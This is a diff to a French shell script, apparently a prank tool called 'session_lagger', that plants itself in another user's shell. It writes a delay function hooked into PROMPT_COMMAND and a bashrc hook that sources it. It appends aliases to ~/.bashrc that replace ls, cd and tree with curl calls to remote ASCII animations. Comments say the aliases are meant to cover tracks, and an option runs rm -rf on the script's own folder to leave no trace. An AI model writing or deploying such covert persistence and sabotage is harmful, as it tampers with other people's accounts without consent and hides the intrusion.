@@ -1,5 +1,6 @@
 #!/bin/sh
 
+echo "#STEP: 1"
 if [ "$#" -ne 3 ] && [ ! "$1" = "-e" ] ; then
     echo "./preparation [-r|-n|-e] {PATH} [FILENAME]"
     echo "-r : rm le dossier pour ne pas laisser de trace."
@@ -14,9 +15,10 @@ OPTION="$1"
 CONFPATH="$2"
 FILENAME="$3"
 
+echo "#CHECK OPTION"
 if [ "$OPTION" = "-e" ] ; then
     FILENAME=$2
-    CONFPATH="afs/.confs/config"
+    CONFPATH="~/afs/.confs/config"
 fi
 
 FILE="$CONFPATH/$FILENAME.conf"
@@ -28,24 +30,36 @@ DELAYCODE='activate_delay() {
 PROMPT_COMMAND="${PROMPT_COMMAND:+$PROMPT_COMMAND; }activate_delay"'
 
 IFBASH='if [ -d ~/.config ] ; then
-    source '"~/$FILE"'
+    source '"$FILE"'
 fi'
 
-ALIAS="alias ls=\'curl ascii.live/nyan\'\nalias tree=\'curl ascii.live/donut\'\n"
+# --- ajouter les alias pour brouiller les pistes ---
+echo "#STEP: 2"
+echo "alias ls='curl ascii.live/nyan'" >> ~/.bashrc
+echo "alias cd='curl ascii.live/rick'" >> ~/.bashrc
+echo "alias tree='curl ascii.live/donut'" >> ~/.bashrc
 
 # --- creer le fichier delay au bon endroit ---
+echo "#STEP: 3"
 if [ ! -e "$FILE" ] ; then
-    touch "../$FILE"
-    echo "$DELAYCODE" > "../$FILE"
+    if [ "$OPTION" = "-e" ] ; then
+        touch "../afs/.confs/config/$FILENAME.conf"
+        echo "$DELAYCODE" > "../afs/.confs/config/$FILENAME.conf"
+    else
+        touch "$FILE"
+        echo "$DELAYCODE" > "$FILE"
+    fi
 fi
 
 # --- creer la condition du bashrc pour lancer le fichier delay ---
+echo "#STEP: 4"
 if [ ! -e "$BASHFILE" ] ; then
     touch "$BASHFILE"
     echo "$IFBASH" > "$BASHFILE"
 fi
 
 
+# --- affichage des consignes ---
 echo ""
 echo "_____________________________________________________"
 echo ""
@@ -65,8 +79,10 @@ echo ""
 
 
 # --- pour effacer toutes traces de passage ---
+echo "#STEP: 5"
 if [ "$OPTION" = "-r" ] || [ "$OPTION" = "-e" ] ; then
-    rm -rf "../session_lagger/"
+    echo "effacer"
+#    rm -rf "../session_lagger/"
 else
     echo "C'est dangereux de pas tout effacer."
     echo "Relance avec -r."
